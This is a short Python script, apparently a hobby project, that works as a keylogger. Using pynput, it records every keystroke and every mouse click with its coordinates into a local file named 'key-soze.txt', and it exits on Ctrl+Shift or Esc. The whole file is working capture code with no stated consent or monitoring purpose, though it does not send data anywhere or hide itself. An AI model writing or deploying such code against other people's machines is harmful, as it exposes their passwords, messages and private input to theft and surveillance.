from pynput import keyboard
from pynput import mouse

f = open("key-soze.txt", "a")
chars_on_current_line = 0  # Counter for the current line

# Variables to track modifier keys
ctrl_pressed = False
shift_pressed = False

def on_key_event(key):
    global chars_on_current_line, ctrl_pressed, shift_pressed
    
    # Track modifier keys
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = True
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = True
        
    # Check if Ctrl+Shift are pressed together
    if ctrl_pressed and shift_pressed:
        f.write("\n-- Exit on Ctrl+Shift --\n")
        f.close()
        return False
    
    try:
        if key.char:
            f.write(f"{key.char}")
            f.flush()
            chars_on_current_line += 1
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.enter:
            f.write("\n")
            chars_on_current_line = 0  # Reset counter
        elif key == keyboard.Key.tab:
            f.write("\t")
            chars_on_current_line += 1
        elif key == keyboard.Key.space:
            f.write(" ")
            chars_on_current_line += 1
        elif key == keyboard.Key.backspace:
            # Only delete if we have characters on the current line
            if chars_on_current_line > 0:
                current_pos = f.tell()
                f.seek(current_pos - 1)
                f.truncate()
                chars_on_current_line -= 1
        else:
            f.write(f"[{key.name}]")
            chars_on_current_line += len(f"[{key.name}]")
        f.flush()

def on_release(key):
    global ctrl_pressed, shift_pressed
    
    # Reset variables when keys are released
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = False
    elif key == keyboard.Key.esc:
        return False

def on_click(x, y, button, pressed):
	if pressed:
		f.write(f"\nMouse clicked at ({x}, {y}) with {button}\n")
		f.flush()

# Collect events until released
try:
    # Start mouse listener in a separate thread
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    
    # Start keyboard listener in main thread
    with keyboard.Listener(on_press=on_key_event, on_release=on_release) as keyboard_listener:
        keyboard_listener.join()

except Exception as e:
    print(f"An error occurred: {e}")
finally:
    f.close()